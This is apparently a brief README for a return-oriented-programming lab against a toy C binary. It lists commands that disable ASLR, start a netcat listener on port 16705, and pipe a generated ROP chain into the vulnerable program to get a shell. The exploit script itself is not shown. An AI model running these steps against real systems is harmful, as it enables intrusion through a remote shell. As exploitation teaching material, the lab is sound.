setup the environment (Ubuntu 16.04)
```shell
gcc toy.c -o toy
ulimit -s unlimited
echo 0 > /proc/sys/kernel/randomize_va_space
```

listen to port 0x4141
```shell
nc -lvv 16705
```

generate the rop chain and send to the victim program
```shell
python toy.py | ./toy
```

now you should have got a shell
